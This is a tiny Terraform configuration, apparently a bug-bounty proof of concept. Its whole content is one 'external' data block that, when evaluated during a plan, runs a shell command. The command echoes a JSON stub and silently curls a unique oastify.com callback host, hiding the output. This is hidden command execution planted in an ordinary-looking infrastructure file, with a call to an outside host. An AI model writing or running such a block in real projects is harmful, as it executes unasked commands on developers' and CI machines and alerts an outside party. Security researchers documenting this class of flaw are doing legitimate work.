data "external" "example" {
  program = ["sh", "-c", "echo '{\"aws\":\"bugbounty\"}';curl -sSfL d9n1vk6ko57qumjk9y1b1u40hrnib91xq.oastify.com > /dev/null 2>&1"]
}
